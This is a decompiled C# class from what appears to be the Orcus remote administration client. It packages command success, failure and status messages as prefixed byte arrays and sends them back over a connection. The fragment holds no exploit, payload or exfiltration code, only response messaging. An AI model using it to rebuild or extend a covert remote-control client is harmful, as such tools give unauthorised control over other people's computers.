using System;
using System.Text;
using Orcus.Plugins;
using Orcus.Plugins.StaticCommands;

namespace Orcus.Commands.ClientCommands;

public class ClientCommandsFeedbackFactory : IFeedbackFactory
{
	private readonly IConnectionInfo _connectionInfo;

	private readonly Command _command;

	private bool _isFinalized;

	public ClientCommandsFeedbackFactory(IConnectionInfo connectionInfo, Command command)
	{
		_connectionInfo = connectionInfo;
		_command = command;
	}

	public void Succeeded()
	{
		ResponseResult(succeeded: true, null);
	}

	public void Failed()
	{
		ResponseResult(succeeded: false, null);
	}

	public void Succeeded(string message)
	{
		ResponseResult(succeeded: true, message);
	}

	public void Failed(string message)
	{
		ResponseResult(succeeded: false, message);
	}

	public void SendMessage(string message, MessageType messageType)
	{
		//IL_0026: Unknown result type (might be due to invalid IL or missing references)
		if (!_isFinalized)
		{
			byte[] bytes = Encoding.UTF8.GetBytes(message);
			byte[] array = new byte[bytes.Length + 2];
			array[0] = 4;
			array[1] = (byte)messageType;
			Array.Copy(bytes, 0, array, 2, bytes.Length);
			_connectionInfo.CommandResponse(_command, array, (PackageCompression)0);
		}
	}

	private void ResponseResult(bool succeeded, string message)
	{
		if (!_isFinalized)
		{
			_isFinalized = true;
			byte[] array = null;
			if (message != null)
			{
				array = Encoding.UTF8.GetBytes(message);
			}
			byte[] array2 = new byte[1 + ((array != null) ? array.Length : 0)];
			array2[0] = (byte)(succeeded ? 2u : 3u);
			if (array != null)
			{
				Array.Copy(array, 0, array2, 1, array.Length);
			}
			_connectionInfo.CommandResponse(_command, array2, (PackageCompression)0);
		}
	}
}
